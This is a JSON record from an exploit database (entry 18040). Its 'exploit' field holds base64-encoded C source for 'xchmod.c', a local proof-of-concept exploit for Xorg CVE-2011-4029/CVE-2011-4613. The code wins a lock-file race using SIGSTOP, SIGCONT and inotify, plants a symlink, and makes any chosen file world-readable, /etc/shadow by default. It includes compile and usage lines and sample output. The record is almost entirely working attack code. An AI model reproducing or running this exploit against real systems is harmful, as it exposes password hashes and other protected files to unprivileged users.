{
    "source": "exploit-database", 
    "exploit": "LyogeGNobW9kLmMgLS0gWG9yZyBmaWxlIHBlcm1pc3Npb24gY2hhbmdlIHZ1bG5lcmFiaWxpdHkgUG9DDQoNCiAgIEF1dGhvcjogICAgdmxhZHogKGh0dHA6Ly92bGFkei5kZXZ6ZXJvLmZyKQ0KICAgRGF0ZTogICAgICAyMDExLzEyLzE1DQogICBTb2Z0d2FyZTogIHd3dy54Lm9yZw0KICAgVmVyc2lvbjogICBYb3JnIDEuNCB0byAxLjExLjIgaW4gYWxsIGNvbmZpZ3VyYXRpb25zLiAgWG9yZyAxLjMgYW5kDQogICAgICAgICAgICAgIGVhcmxpZXIgaWYgYnVpbHQgd2l0aCB0aGUgVVNFX0NITU9EIHByZXByb2Nlc3NvciBpZGVudGlmaWVyDQogICBUZXN0ZWQgb246IERlYmlhbiA2LjAuMiB1cCB0byBkYXRlIHdpdGggWCBkZWZhdWx0IGNvbmZpZ3VyYXRpb24gaXNzdWVkDQogICAgICAgICAgICAgIGZyb20gdGhlIHhzZXJ2ZXIteG9yZy1jb3JlIHBhY2thZ2UgKHZlcnNpb24gMjoxLjcuNy0xMykNCiAgIENWRXM6ICAgICAgQ1ZFLTIwMTEtNDAyOSAmIENWRS0yMDExLTQ2MTMNCg0KICAgVGhpcyBQb0MgZXhwbG9pdHMgQ1ZFLTIwMTEtNDAyOSB0byBzZXQgdGhlIHJpZ2h0cyA0NDQgKHJlYWQgZm9yIGFsbCkgb24NCiAgIGFyYml0cmFyeSBmaWxlIHNwZWNpZmllZCBhcyBhcmd1bWVudCAoZGVmYXVsdCBmaWxlIGlzICIvZXRjL3NoYWRvdyIpLg0KICAgSXQgdXNlcyBTSUdTVE9QL1NJR0NPTlQgc2lnbmFscyBhbmQgdGhlIElub3RpZnkgQVBJIHRvIHdpbiB0aGUgcmFjZS4NCiAgIE1hZGUgZm9yIEVEVUNBVElPTkFMIFBVUlBPU0VTIE9OTFkhDQoNCiAgIE9uIHNvbWUgY29uZmlndXJhdGlvbnMsIHRoaXMgZXhwbG9pdCBtdXN0IGJlIGxhdW5jaGVkIGZyb20gYSBUVFkgKHN3aXRjaA0KICAgYnkgdHlwaW5nIEN0cmwtQWx0LUZuKS4gIEJ1dCBub3Qgb24gRGViaWFuLCBiZWNhdXNlIGl0IGJ5cGFzc2VzIHRoZSBYDQogICB3cmFwcGVyIHBlcm1pc3Npb24gdGhhbmtzIHRvIENWRS0yMDExLTQ2MTMhDQoNCiAgIFRlc3RlZCBvbiBEZWJpYW4gNi4wLjMgdXAgdG8gZGF0ZSB3aXRoIFggZGVmYXVsdCBjb25maWd1cmF0aW9uIGlzc3VlZA0KICAgZnJvbSB0aGUgeHNlcnZlci14b3JnLWNvcmUgcGFja2FnZSAodmVyc2lvbiAyOjEuNy43LTEzKS4NCg0KICAgQ29tcGlsZTogIGNjIHhjaG1vZC5jIC1vIHhjaG1vZA0KICAgVXNhZ2U6ICAgIC4veGNobW9kIFsvcGF0aC90by9maWxlXSAgICAoZGVmYXVsdCBmaWxlIGlzIC9ldGMvc2hhZG93KQ0KDQogICAkIGxzIC1sIC9ldGMvc2hhZG93DQogICAtcnctci0tLS0tIDEgcm9vdCBzaGFkb3cgMTA3MiBBdWcgIDcgMDc6MTAgL2V0Yy9zaGFkb3cNCiAgICQgLi94Y2htb2QNCiAgIFsrXSBUcnlpbmcgdG8gc3RvcCBhIFhvcmcgcHJvY2VzcyByaWdodCBiZWZvcmUgY2htb2QoKQ0KICAgWytdIFByb2Nlc3MgSUQgNDEzNCBzdG9wcGVkIChTSUdTVE9QIHNlbnQpDQogICBbK10gUmVtb3ZpbmcgL3RtcC8udFgxLWxvY2sgYnkgbGF1bmNoaW5nIGFub3RoZXIgWG9yZyBwcm9jZXNzDQogICBbK10gQ3JlYXRpbmcgZXZpbCBzeW1saW5rICgvdG1wLy50WDEtbG9jayAtPiAvZXRjL3NoYWRvdykNCiAgIFsrXSBQcm9jZXNzIElEIDQxMzQgcmVzdW1lZCAoU0lHQ09OVCBzZW50KQ0KICAgWytdIEF0dGFjayBzdWNjZWVkZWQsIGxzIC1sIC9ldGMvc2hhZG93Og0KICAgLXItLXItLXItLSAxIHJvb3Qgc2hhZG93IDEwNzIgQXVnICA3IDA3OjEwIC9ldGMvc2hhZG93DQoNCiAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiAgICAiVEhFIEJFRVItV0FSRSBMSUNFTlNFIiAoUmV2aXNpb24gNDIpOg0KICAgIDx2bGFkekBkZXZ6ZXJvLmZyPiB3cm90ZSB0aGlzIGZpbGUuIEFzIGxvbmcgYXMgeW91IHJldGFpbiB0aGlzIG5vdGljZQ0KICAgIHlvdSBjYW4gZG8gd2hhdGV2ZXIgeW91IHdhbnQgd2l0aCB0aGlzIHN0dWZmLiBJZiB3ZSBtZWV0IHNvbWUgZGF5LCBhbmQNCiAgICB5b3UgdGhpbmsgdGhpcyBzdHVmZiBpcyB3b3J0aCBpdCwgeW91IGNhbiBidXkgbWUgYSBiZWVyIGluIHJldHVybi4gLVYuDQoqLw0KDQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN5c2NhbGwuaD4NCiNpbmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy9pbm90aWZ5Lmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCg0KI2RlZmluZSBYT1JHX0JJTiAgICAgIi91c3IvYmluL1giDQojZGVmaW5lIERJU1BMQVkgICAgICAiOjEiDQoNCg0KY2hhciAqZ2V0X3R0eV9udW1iZXIodm9pZCkgew0KICBjaGFyIHR0eV9uYW1lWzEyOF0sICpwdHI7DQoNCiAgbWVtc2V0KHR0eV9uYW1lLCAnXDAnLCBzaXplb2YodHR5X25hbWUpKTsNCiAgcmVhZGxpbmsoIi9wcm9jL3NlbGYvZmQvMCIsIHR0eV9uYW1lLCBzaXplb2YodHR5X25hbWUpKTsNCg0KICBpZiAoKHB0ciA9IHN0cnN0cih0dHlfbmFtZSwgInR0eSIpKSkNCiAgICByZXR1cm4gcHRyICsgMzsNCg0KICByZXR1cm4gTlVMTDsNCn0NCg0KDQp2b2lkIHRpbWVvdXRfaGFuZGxlcigpIHsNCg0KICBwcmludGYoIlstXSByZWFkKCkgdGltZW91dCEgIFxuIik7DQogIGlmICghZ2V0X3R0eV9udW1iZXIoKSkNCiAgICBwcmludGYoIlRyeSB3aXRoIGNvbnNvbGUgb3duZXJzaGlwOiBzd2l0Y2ggdG8gYSBUVFkgYnkgdXNpbmcgIg0KCSAgICJDdHJsLUFsdC1GWzEtNl0gYW5kIHRyeSBhZ2Fpbi5cbiIpOw0KICBlbHNlDQogICAgcHJpbnRmKCJNYXliZSBpbm90aWZ5IGlzbid0IGVuYWJsZWQuXG4iKTsNCg0KICBfZXhpdCgxKTsNCn0NCg0KDQppbnQgbGF1bmNoX3hvcmdfaW5zdGFuY2UoaW50IGluYykgew0KICBpbnQgcGlkLCBuZXdmZDsNCiAgY2hhciAqb3B0W10gPSB7IFhPUkdfQklOLCBESVNQTEFZLCBOVUxMIH07DQoNCiAgaWYgKChwaWQgPSBmb3JrKCkpID09IDApIHsNCiAgICBuZXdmZCA9IG9wZW4oIi9kZXYvdHR5IiwgT19SRE9OTFkpOw0KICAgIGR1cDIobmV3ZmQsIDApOyBjbG9zZSgxKTsgY2xvc2UoMik7IA0KDQogICAgbmljZShpbmMpOyB1c2xlZXAoMzAwMDApOw0KICAgIGV4ZWN2ZShYT1JHX0JJTiwgb3B0LCBOVUxMKTsNCiAgICBfZXhpdCgwKTsNCiAgfQ0KDQogIHJldHVybiBwaWQ7DQp9DQoNCg0Kdm9pZCBzaG93X3RhcmdldF9maWxlKGNoYXIgKmZpbGUpIHsNCiAgY2hhciBjbWRbMTI4XTsNCg0KICBtZW1zZXQoY21kLCAnXDAnLCBzaXplb2YoY21kKSk7DQogIHNwcmludGYoY21kLCAiL2Jpbi9scyAtbCAlcyIsIGZpbGUpOw0KICBzeXN0ZW0oY21kKTsNCn0NCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsNCiAgcGlkX3QgcGlkLCByZW1vdmVfcGlkOw0KICBzdHJ1Y3Qgc3RhdCBzdDsNCiAgaW50IGZkLCB3ZCwgc3RhdHVzOw0KICBjaGFyIHRhcmdldGZpbGVbMTI4XSwgbG9ja2ZpbGV0bXBbMjBdLCBsb2NrZmlsZVsyMF07DQoNCiAgaWYgKGFyZ2MgPCAyKQ0KICAgIHN0cmNweSh0YXJnZXRmaWxlLCAiL2V0Yy9zaGFkb3ciKTsNCiAgZWxzZQ0KICAgIHN0cmNweSh0YXJnZXRmaWxlLCBhcmd2WzFdKTsNCg0KICBzcHJpbnRmKGxvY2tmaWxlLCAiL3RtcC8uWCVzLWxvY2siLCBESVNQTEFZICsgMSk7DQogIHNwcmludGYobG9ja2ZpbGV0bXAsICIvdG1wLy50WCVzLWxvY2siLCBESVNQTEFZICsgMSk7DQoNCiAgaWYgKHN0YXQobG9ja2ZpbGUsICZzdCkgPT0gMCkgew0KICAgIHByaW50ZigiWy1dICVzIGV4aXN0cywgbWF5YmUgWG9yZyBpcyBhbHJlYWR5IHJ1bm5pbmcgb24gdGhpcyINCgkgICAiIGRpc3BsYXk/ICBDaG9vc2UgYW5vdGhlciBkaXNwbGF5IGJ5IGVkaXRpbmcgdGhlIERJU1BMQVkiDQoJICAgIiBhdHRyaWJ1dGVzLlxuIiwgbG9ja2ZpbGUpOw0KICAgIHJldHVybiAxOw0KICB9DQoNCiAgdW1hc2soMDc3KTsNCiAgc2lnbmFsKFNJR0FMUk0sIHRpbWVvdXRfaGFuZGxlcik7DQoNCiAgc3ltbGluaygiL2RvbnRleGlzdCIsIGxvY2tmaWxlKTsNCg0KICBmZCA9IGlub3RpZnlfaW5pdCgpOw0KICB3ZCA9IGlub3RpZnlfYWRkX3dhdGNoKGZkLCAiL3RtcCIsIElOX0NSRUFURSk7DQoNCiAgYWxhcm0oNSk7DQogIHByaW50ZigiWytdIFRyeWluZyB0byBzdG9wIGEgWG9yZyBwcm9jZXNzIHJpZ2h0IGJlZm9yZSBjaG1vZCgpXG4iKTsNCiAgcGlkID0gbGF1bmNoX3hvcmdfaW5zdGFuY2UoMTkpOw0KICBzeXNjYWxsKFNZU19yZWFkLCBmZCwgMCwgMCk7DQogIHN5c2NhbGwoU1lTX2tpbGwsIHBpZCwgU0lHU1RPUCk7DQogIGFsYXJtKDApOw0KDQogIHByaW50ZigiWytdIFByb2Nlc3MgSUQgJWQgc3RvcHBlZCAoU0lHU1RPUCBzZW50KVxuIiwgcGlkKTsNCg0KICBpbm90aWZ5X3JtX3dhdGNoKGZkLCB3ZCk7DQoNCiAgc3RhdChsb2NrZmlsZXRtcCwgJnN0KTsNCiAgaWYgKChzdC5zdF9tb2RlICYgNCkgIT0gMCkgew0KICAgIHByaW50ZigiWy1dICVzIGZpbGUgaGFzIHdyb25nIHJpZ2h0cyAoJW8pIHJlbW92aW5nIGl0IGJ5IGxhdW5jaGluZyINCgkgICAiIGFub3RoZXIgWG9yZyBwcm9jZXNzXG5bLV0gQXR0YWNrIGZhaWxlZC4gIFRyeSBhZ2FpbiFcbiIsDQoJICAgbG9ja2ZpbGV0bXAsIHN0LnN0X21vZGUpOw0KDQogICAgcmVtb3ZlX3BpZCA9IGxhdW5jaF94b3JnX2luc3RhbmNlKDApOw0KICAgIHdhaXRwaWQocmVtb3ZlX3BpZCwgJnN0YXR1cywgMCk7DQogICAgdW5saW5rKGxvY2tmaWxlKTsNCiAgICByZXR1cm4gMTsNCiAgfQ0KDQogIHByaW50ZigiWytdIFJlbW92aW5nICVzIGJ5IGxhdW5jaGluZyBhbm90aGVyIFhvcmcgcHJvY2Vzc1xuIiwNCgkgbG9ja2ZpbGV0bXApOw0KICByZW1vdmVfcGlkID0gbGF1bmNoX3hvcmdfaW5zdGFuY2UoMCk7DQogIHdhaXRwaWQocmVtb3ZlX3BpZCwgJnN0YXR1cywgMCk7DQoNCiAgcHJpbnRmKCJbK10gQ3JlYXRpbmcgZXZpbCBzeW1saW5rICglcyAtPiAlcylcbiIsIGxvY2tmaWxldG1wLA0KCSB0YXJnZXRmaWxlKTsNCiAgc3ltbGluayh0YXJnZXRmaWxlLCBsb2NrZmlsZXRtcCk7DQoNCiAgcHJpbnRmKCJbK10gUHJvY2VzcyBJRCAlZCByZXN1bWVkIChTSUdDT05UIHNlbnQpXG4iLCBwaWQpOw0KICBraWxsKHBpZCwgU0lHQ09OVCk7DQogIHdhaXRwaWQocGlkLCAmc3RhdHVzLCAwKTsNCg0KICB1bmxpbmsobG9ja2ZpbGUpOw0KDQogIHN0YXQodGFyZ2V0ZmlsZSwgJnN0KTsNCiAgaWYgKCEoc3Quc3RfbW9kZSAmIDAwNCkpIHsNCiAgICBwcmludGYoIlstXSBBdHRhY2sgZmFpbGVkLCByaWdodHMgYXJlICVvLiAgVHJ5IGFnYWluIVxuIiwgc3Quc3RfbW9kZSk7DQogICAgcmV0dXJuIDE7DQogIH0NCg0KICBwcmludGYoIlsrXSBBdHRhY2sgc3VjY2VlZGVkLCBscyAtbCAlczpcbiIsIHRhcmdldGZpbGUpOw0KICBzaG93X3RhcmdldF9maWxlKHRhcmdldGZpbGUpOw0KDQogIHJldHVybiAwOw0KfQ==", 
    "filename": "platforms/linux/local/18040.c", 
    "id": "18040", 
    "cves": [
        "CVE-2011-4029", 
        "CVE-2011-4613"
    ]
}